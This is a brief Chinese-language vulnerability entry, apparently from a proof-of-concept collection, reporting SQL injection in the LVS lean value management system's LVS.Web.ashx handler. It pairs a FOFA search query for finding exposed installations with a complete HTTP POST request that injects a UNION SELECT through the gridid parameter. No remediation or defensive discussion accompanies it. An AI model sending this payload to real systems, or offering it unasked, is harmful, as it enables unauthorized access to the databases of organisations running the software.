## LVS精益价值管理系统LVS.Web.ashx存在SQL注入漏洞



## fofa

```
body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
```

## poc

```
POST /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: text/plain; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
 
src=AgencytaskList
gridid=1' UNION ALL SELECT @@VERSION--
```

